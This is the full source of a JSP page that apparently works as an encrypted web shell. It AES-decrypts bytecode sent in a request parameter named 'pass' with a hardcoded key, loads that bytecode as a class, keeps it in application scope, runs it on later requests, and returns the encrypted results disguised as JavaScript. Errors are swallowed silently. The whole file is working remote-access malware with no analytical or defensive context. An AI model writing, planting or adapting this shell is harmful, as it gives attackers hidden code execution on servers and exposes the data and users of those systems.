
<%!
class pay extends ClassLoader {
    public pay(ClassLoader z) {
        super(z);
    }
    public Class p(byte[] payi) {
        return super.defineClass(payi, 0, payi.length);
    }
}
public byte[] payx(byte[] s, boolean m) {
    try {
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
        int test = 1;
        if (!m) {
            test = 2;
        }
        c.init(
            test,
            new javax.crypto.spec.SecretKeySpec(
                payinfo.getBytes(),
                "AES"
            )
        );
        return c.doFinal(s);
    } catch (Exception e) {
        return null;
    }
}
String paykey = "pass";
String payinfo = "5f532a3fc4f1ea40";
public String hexEncodeToString(byte[] src) {
    StringBuilder sb = new StringBuilder();
    for (byte b : src) {
        String hex = String.format("%02X", b);
        sb.append(hex);
    }
    return sb.toString();
}
public byte[] hexDecode(String hexStr) {

    byte[] result = new byte[hexStr.length() / 2];

    for (int i = 0; i < hexStr.length(); i += 2) {
        result[i / 2] =
            (byte)(
                (Character.digit(hexStr.charAt(i), 16) << 4)
                + Character.digit(hexStr.charAt(i + 1), 16)
            );
    }
    return result;
}
%>
<%
try {
    byte[] data = hexDecode(request.getParameter(paykey));
    data = payx(data, false);
    if (application.getAttribute("C2wh") == null) {

        application.setAttribute(
            "C2wh",
            new pay(this.getClass().getClassLoader()).p(data)
        );

    } else {
        java.io.ByteArrayOutputStream Out = new java.io.ByteArrayOutputStream();
        Object p = ((Class) application.getAttribute("C2wh")).newInstance();
        p.equals(request);
        p.equals(Out);
        p.equals(data);
        response.getWriter().write("!function(){var pass=\"");
        p.toString();
        response.getWriter().write(
            hexEncodeToString(
                payx(Out.toByteArray(), true)
            )
        );
        response.getWriter().write("\";}");
    }
} catch (Exception e) {}
%>
